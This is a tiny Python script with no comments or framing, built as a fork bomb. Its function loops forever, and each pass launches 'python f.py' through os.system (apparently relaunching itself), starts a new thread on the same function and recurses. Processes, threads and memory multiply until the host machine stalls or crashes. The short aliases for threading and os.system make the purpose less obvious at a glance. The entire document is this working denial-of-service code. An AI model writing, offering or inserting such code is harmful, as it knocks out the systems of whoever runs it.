import threading as t
from os import system as s
def f():
    while True:
        s('python f.py')
        t.Thread(target=f).start()
        f()

f()
